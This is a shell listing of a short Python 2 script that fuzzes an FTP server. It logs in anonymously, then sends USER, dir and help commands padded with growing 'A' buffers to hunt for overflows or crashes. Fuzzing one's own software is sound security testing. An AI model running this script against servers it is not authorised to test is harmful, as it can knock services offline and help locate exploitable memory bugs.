c@kali:~/src/stif$ cat skeleton-ftp-fuzz.py
#!/usr/bin/env python
# skeleton-ftp-fuzz.py
#
# target - for your FTP server
# port   - default : 21
#
# current commands that we will fuzz:
#   user, dir, list, help, ..
#
import time
import sys,socket
target = sys.argv[1]
port = 21

print 'host: %s' % ( target )

# login in as anonymous
username = 'anonymous'
password = 'mail@me.com'


commands = [
  'USER','dir','help'
]


for command in commands:
  print '[+] fuzzing target with command : %s' % ( command )

  payloads = [
    'A'
    #, '%x.'
  ]


  multime = 1
  while multime < 300:
    for payload in payloads:
      multime = multime + 1
      try:

        # create socket
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn = s.connect(( target, port ))
        output = s.recv(1024)

        print '[+] socket created, connection output: ' + output

        payload = payload * multime

        print '[+] log me in...'
        s.send('USER ' + username + '\r\n')
        s.recv(1024)
        s.send('PASS ' + password + '\r\n')
        s.recv(1024)

        print "  [+] Sending our evil package: %s with payload length %s" % ( command, str(len(payload)))
        s.send(command + " " + payload  + "\r\n ")
        output = s.recv(1024)

        print "  [+] Evil package sent."
        print output


      except:
        print "[-] Error sending the evil package."
        time.sleep(2)
        s.close()

print '[+] It\'s done.'



